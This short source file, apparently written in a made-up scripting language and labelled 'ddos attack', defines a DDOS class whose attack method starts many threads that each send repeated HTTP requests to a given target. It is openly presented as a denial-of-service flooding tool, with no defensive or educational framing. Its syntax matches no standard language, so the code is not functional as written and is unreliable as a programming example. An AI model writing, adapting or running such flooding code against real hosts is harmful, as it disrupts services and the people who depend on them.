
# author: linwin-cloud
# ddos attack

class DDOS: public
    private number = 1000
    private data = 10

    func set_user(num) public
        val number = num
    end_func

    func set_data(num) public
        val data = num
    end_func

    func attack(target) public
        print("[INFO] Start attack ==>")
        f attack_user()
            for (http_requests(target) , data)
        e_f
        for (new_thread(attack_user()) , number)

    end_func
end_class